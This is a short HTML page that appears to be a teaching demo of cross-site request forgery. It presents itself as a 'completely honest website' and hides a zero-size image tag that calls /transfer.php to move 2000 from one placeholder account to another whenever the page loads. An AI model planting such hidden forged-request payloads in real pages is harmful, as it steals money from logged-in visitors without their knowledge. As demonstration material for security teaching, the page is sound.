<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>CSRF Example Bad Page</title>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" type="text/css" />
    </head>
    <body>
        <div class="container">
            <h1 class="page-header">This is a completely honest website.</h1>
            <p class="alert alert-success">This website can be trusted! Nothing is going to happen as you browse this page. In fact I double dare you to refresh this page 4 times.</p>
            <img src="/transfer.php?transfer_from=AB12345&transfer_to=XY09876&amount=2000" width="0" height="0" />
            <p class="text-danger">You might want to check your account though! Just saying &hellip;</p>
        </div>
    </body>
</html>